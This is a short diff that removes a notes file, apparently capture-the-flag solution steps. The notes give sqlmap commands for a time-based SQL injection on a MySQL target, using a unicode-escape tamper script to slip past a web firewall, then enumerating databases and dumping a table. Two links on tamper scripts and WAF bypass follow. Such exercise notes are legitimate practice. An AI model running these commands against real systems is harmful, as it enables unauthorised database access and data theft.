@@ -1,5 +1,0 @@
-1.sudo sqlmap -r request.txt --tamper=charunicodeescape --technique=T --dbs --dbms=mysql
-2..udo sqlmap -r request.txt --tamper=charunicodeescape --technique=T --dbs --dbms=mysql -D db_m8452 -T definitely_not_a_flag --dump
-3.https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3
-https://www.programmersought.com/article/48273198605/
-4.
